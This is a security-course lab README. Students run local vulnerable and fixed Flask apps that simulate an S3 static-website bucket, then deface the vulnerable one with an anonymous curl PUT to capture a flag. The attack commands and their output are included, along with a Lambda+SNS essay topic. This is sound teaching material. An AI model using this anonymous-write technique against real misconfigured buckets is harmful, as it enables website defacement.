# {{ slot_label }} — S3 Static Website Hosting + Lambda/SNS Event-Driven Email

**Topic (source):** AWS Academy Cloud Foundations' S3 static website hosting module and the
Lambda+SNS event-driven email pattern, described here in our own words — **not** copied from
any AWS Academy file. **Kind:** LAB.
**Concepts:** S3 bucket resource policies for static website hosting, public-read vs.
public-write, principle of least privilege on a resource-based policy, event-driven
(pub/sub) architecture · **Analogous CWE:** CWE-284 (Improper Access Control), CWE-668
(Exposure of Resource to Wrong Sphere).

## This lesson — what to do
1. **Before class** — Docker Desktop working; complete the real AWS Academy Lab on S3 static
   website hosting and the Lambda+SNS email exercise in your Learner Lab sandbox first (that's
   still where you learn the actual AWS console UI, S3 bucket creation, and SNS topic wiring).
2. **This add-on lab (45–60 min)** — a local, from-scratch simulation of the S3 static-website
   bucket-policy concept: a tiny "S3 website endpoint"-like API you can inspect and attack
   without an AWS account. Follow **Step-by-step** below (kickoff: `docker compose up -d --build`).
3. **Submit** — worksheet + flag → see [SUBMISSION.md](../../SUBMISSION.md).

## Background — the two bugs this lab is and isn't about
When you enable S3 static website hosting, the bucket must serve pages to anonymous browsers,
so its bucket policy needs a statement granting `Principal: "*"` the `s3:GetObject` action.
**That part is correct and intended** — it's the whole point of website hosting, and it is
identical in both apps below.

The bug this lab teaches is a **scoping mistake on top of that correct pattern**: someone
copy-pasted a broader read/write policy template (maybe meant for an authenticated deploy role)
and left `s3:PutObject` in the public, `Principal: "*"` statement too. The result: **any
anonymous caller on the internet, with no credentials of any kind, can overwrite files in the
hosted site** — including `index.html`. This is website defacement via an S3 bucket-policy
misconfiguration, a real and recurring class of incident.

## Signature exercise — "Deface the Site"
Two Flask targets, same endpoints, one resource-policy difference:

| Service | Port | Bucket policy | Anonymous `GET index.html`? | Anonymous `PUT index.html` (no auth header)? |
|---|---|---|---|---|
| `vulnerable_app.py` | `:8105` | `Principal: "*"` → `[GetObject, PutObject]` | **Yes (200)** | **Yes (200) — defaces the site** |
| `fixed_app.py` | `:8106` | `Principal: "*"` → `[GetObject]` only | **Yes (200)** | **No (403)** |

**Why it's exciting:** you don't need to steal any credentials, guess a password, or assume a
role — the bucket's own public policy hands out write access to *anyone who asks*. Public read
is supposed to be public; public write is the mistake.

1. **Baseline:** `GET /bucket/website/index.html` with no headers at all. Confirm this returns
   the site's homepage content on **both** `:8105` and `:8106` — public read-only hosting works
   correctly and identically on both.
2. **The real question:** try `PUT /bucket/website/index.html` **without any `Authorization`
   header at all** — no credentials, no assumed role, nothing.
3. On `:8105` (vulnerable) this succeeds, overwrites the homepage, and returns the flag — the
   bucket policy's `Principal: "*"` statement includes `PutObject`, so it doesn't matter who (or
   whether anyone) is calling.
4. **Confirm the fix:** the identical anonymous `PUT` against `:8106` (fixed) is rejected
   (`403`) — while the identical anonymous `GET` still succeeds on `:8106` too. That's the
   empirical proof that the fix removes only the *extra*, unintended grantee (public write); it
   does not touch the legitimate, intended grantee (public read).

## Step-by-step (copy these commands)
**First, get this lab onto your computer.** You need your own copy of the course files. You download them once, then update them each
time. Open a terminal (Terminal on macOS or Linux, **Git Bash** on Windows) and do
A, B and C in order. You installed Git in the Week 01 setup; if `git` is "not found", do that
setup first.

A. **Download the course files (first time only).** Skip this if you already did it in Week 01.
   ```bash
   cd ~
   git clone https://github.com/nutthakorn7/cloud-infrastructure-security.git
   ```
   You should see `Cloning into 'cloud-infrastructure-security'...` and no error. If it says
   `already exists`, you have the files already: go on to B.

B. **Get the newest version (every time).** The course files change during the term, so do this
   even if you downloaded them last week. It never touches your `.env` file.
   ```bash
   cd ~/cloud-infrastructure-security
   git pull
   ```
   You should see `Already up to date.` or a list of changed files. If you see
   `No such file or directory`, your copy is in another folder: do A to make a new one here. If you
   see `Your local changes to the following files would be overwritten`, run `git checkout -- .`
   and then `git pull` again. That throws away any edits you made to the course files; your
   answers are on the Answer Sheet, so they are safe.

C. **Go into this lab's folder and check it.**
   ```bash
   cd {{ labpath }}
   ls
   ```
   You should see `README.md`, `worksheet.md` and `docker-compose.yml` among the files. Every
   command below runs from this folder. If you open a new terminal later, do B and C again first.

Run these in a terminal inside this lab folder: Terminal on macOS or Linux, or **Git Bash** on
Windows (it comes with Git). Each step says what you should see. Do them in order: the attack in
step 4 really overwrites the vulnerable app's homepage, so read the original page first.

0. **Your personal flag:** save the `.env` file from your Classroom private comment in this folder
   first (see "Your personal flag" below). Without it you capture the shared placeholder flag,
   which earns no marks.
1. **Start both apps.** The first run downloads and builds the image, so it can take a few
   minutes.
   ```bash
   docker compose up -d --build
   ```
   When it finishes, wait about 10 seconds for the apps to start.
2. **Check that both apps are running.** If you see only `HTTP 000`, the apps are still starting:
   wait a few seconds and run the command again.
   ```bash
   curl -s -w 'HTTP %{http_code}\n' http://localhost:8105/ping
   curl -s -w 'HTTP %{http_code}\n' http://localhost:8106/ping
   ```
   You should see `{"mode":"vulnerable","status":"ok"}` and then `{"mode":"fixed","status":"ok"}`,
   each followed by `HTTP 200`.
3. **Normal use: read the homepage with no credentials**, on both apps.
   ```bash
   curl -s -w 'HTTP %{http_code}\n' http://localhost:8105/bucket/website/index.html
   curl -s -w 'HTTP %{http_code}\n' http://localhost:8106/bucket/website/index.html
   ```
   Both should show `"content":"<html><body><h1>Welcome to our official site</h1></body></html>"`
   and `HTTP 200`. Public read works the same on both apps, as a website should.
4. **The attack:** overwrite the vulnerable app's homepage. The command sends no `Authorization`
   header and no credentials of any kind.
   ```bash
   curl -s -w 'HTTP %{http_code}\n' -X PUT http://localhost:8105/bucket/website/index.html -H 'Content-Type: application/json' -d '{"content": "<html><body><h1>PWNED by anonymous PUT</h1></body></html>"}'
   ```
   You should see `"status":"uploaded"`, `"flag":"FLAG{...}"` and `HTTP 200`. That flag is yours:
   copy it into the worksheet, together with the whole `curl` command you sent.
5. **See that the site really changed:** read the vulnerable app's homepage again.
   ```bash
   curl -s -w 'HTTP %{http_code}\n' http://localhost:8105/bucket/website/index.html
   ```
   You should now see `PWNED by anonymous PUT` instead of `Welcome to our official site`. Anyone
   who opens the site would see the attacker's page.
6. **The same attack on the fixed app:**
   ```bash
   curl -s -w 'HTTP %{http_code}\n' -X PUT http://localhost:8106/bucket/website/index.html -H 'Content-Type: application/json' -d '{"content": "<html><body><h1>PWNED by anonymous PUT</h1></body></html>"}'
   ```
   You should see `{"error":"AccessDenied","key":"index.html"}` and `HTTP 403`, with no flag.
7. **Public read still works on the fixed app:**
   ```bash
   curl -s -w 'HTTP %{http_code}\n' http://localhost:8106/bucket/website/index.html
   ```
   You should still see `Welcome to our official site` and `HTTP 200`. The fix blocked public
   write but kept public read.
8. **Stop the apps when you finish.**
   ```bash
   docker compose down
   ```

To start again with the original homepage, run `docker compose restart vulnerable` (the bucket
lives in the app's memory, so a restart resets it). If a step doesn't match, check that Docker
Desktop is running and that you are in this lab folder, then ask in class.

## Run it
```bash
cd {{ labpath }}
docker compose up -d --build   # vulnerable_app.py on :8105, fixed_app.py on :8106
python3 -m pip install requests           # once, on the host
python3 exploit.py
```
`exploit.py` runs the same checks in one go (an optional self-check, not a replacement for the
steps above). Expect two `PASS` lines and exit `0`: an anonymous defacement + flag on `:8105`, a
rejected anonymous write (no flag) on `:8106`, with public GET succeeding on both.

**Verified (2026-11-02):** The "get this lab" commands (A, B and C) were run as written on 2026-11-08, in bash and in zsh, on a fresh clone. `docker compose up -d --build` was run on this machine, every command
in Step-by-step was run as written (Step 0 was tested with a stand-in `.env`, and the captured flag
changed to its value; `docker compose restart vulnerable` restored the original homepage), and
`exploit.py` ran from the host against the published ports. Real captured output of `exploit.py`,
flag value masked:
```
=== VULNERABLE (bucket policy grants Principal:'*' both Get+PutObject) (http://localhost:8105) ===
[*] anonymous GET index.html (public website hosting) -> 200 {'content': '<html><body><h1>Welcome to our official site</h1></body></html>', 'key': 'index.html'}
[*] anonymous (no auth header at all) PUT index.html   -> 200 {'content': '<html><body><h1>PWNED by anonymous PUT</h1></body></html>', 'flag': 'FLAG{...}', 'key': 'index.html', 'status': 'uploaded'}
PASS: anonymous caller defaced index.html on the vulnerable app, flag = FLAG{...}

=== FIXED (bucket policy grants Principal:'*' GetObject only) (http://localhost:8106) ===
[*] anonymous GET index.html (public website hosting) -> 200 {'content': '<html><body><h1>Welcome to our official site</h1></body></html>', 'key': 'index.html'}
[*] anonymous (no auth header at all) PUT index.html   -> 403 {'error': 'AccessDenied', 'key': 'index.html'}
PASS: anonymous caller correctly REJECTED on the fixed app (403), no flag
```
Exit code `0`. Negative controls confirmed separately: an unknown object key returns `404
NoSuchKey` (not a crash) on both apps; re-`GET`ting `index.html` on the vulnerable app after the
exploit confirms the defacement persisted (the site now really does serve the attacker's HTML),
demonstrating that this is a real overwrite, not just an accepted-but-discarded request.

**Your personal flag.** Each student gets a personal `.env` file from the instructor, sent
privately (in this course, as a Google Classroom private comment). Save it as `.env` in this lab
folder before `docker compose up`: Compose reads `FLAG_S3SITE` from it, so the flag you capture is
yours alone. Without it, `FLAG_S3SITE` falls back to a shared placeholder that is the same for
everyone and earns no marks. Don't share or commit your `.env` (it is git-ignored). Instructors
generate the files with `python3 instructor/seed_flags.py env <STUDENT_ID>` (instructor-only, not
in this repo), which mints this lesson's `s3site` flag from the course manifest.

**Evidence artifact.** The attributable evidence is the captured `flag` value returned by the
*vulnerable* app's anonymous write to `index.html`. The fixed app never returns it. Submitting
another student's flag is a violation.

## Deliverable
The captured flag + the exact request (method, path, headers-or-lack-thereof, body) that
produced it + a one-paragraph explanation of why granting `Principal: "*"` the `PutObject`
action is a fundamentally different (and much worse) mistake than granting it `GetObject` for a
website-hosting bucket — one is the intended public-facing behavior, the other hands out write
access to the entire internet.

## Conceptual add-on — Lambda + SNS event-driven email (no second Docker lab)
This lesson's second topic — a Lambda function publishing to an SNS topic to trigger an email
notification — stays conceptual for this lab; it's covered in **Worksheet Part 1** as an essay
question. Bring your understanding of the AWS Academy Learner Lab exercise (S3 event triggers
Lambda, Lambda publishes to SNS, SNS delivers to a subscribed email endpoint) to that question:
in particular, why the **publisher** (Lambda) can complete its work and return immediately
without waiting for the **subscriber** (an email inbox) to be reachable, read the message, or
even exist yet — the defining trait of event-driven (pub/sub) architecture versus a
synchronous request-response call.

## References
- AWS S3 documentation — *Hosting a static website using Amazon S3*, *Bucket policy examples*
  (publicly available, general concept — no AWS Academy file used or copied).
- AWS S3 documentation — *Identity and access management in Amazon S3*, specifically the
  difference between `s3:GetObject` and `s3:PutObject` in a public, `Principal: "*"` statement.
- AWS documentation — *Amazon SNS: how it works*, *Using AWS Lambda with Amazon S3* (general,
  publicly documented event-driven architecture concepts — no AWS Academy file used or copied).
